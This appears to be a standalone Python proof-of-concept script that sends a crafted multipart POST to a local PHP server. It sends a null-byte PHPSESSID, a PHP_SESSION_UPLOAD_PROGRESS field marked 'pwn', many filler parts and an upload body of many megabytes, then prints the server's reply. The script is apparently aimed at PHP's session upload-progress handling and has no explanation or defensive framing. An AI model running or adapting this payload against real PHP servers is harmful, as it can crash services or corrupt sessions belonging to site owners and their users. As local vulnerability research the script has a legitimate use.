#!/usr/bin/env python3
import socket,sys
NV=int(sys.argv[1]); HUGE=int(sys.argv[2]) if len(sys.argv)>2 else 12
BND=b'S'*17
parts=[{'n':b'a','d':b'x'} for _ in range(NV)]
parts.append({'n':b'PHPSESSID','d':b'\x00'})
parts.append({'n':b'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'})
parts.append({'n':b'f','filename':b'a.txt','d':b'A'*64})
parts.append({'n':b'big','d':b'B'*(HUGE*1024*1024)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['n']+b'"; filename="'+p['filename']+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['n']+b'"\r\n\r\n'
    o+=p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
d=b''
try:
    while True:
        c=s.recv(65536)
        if not c: break
        d+=c
except OSError: pass
s.close()
print(d[:900].decode('latin1','replace'))
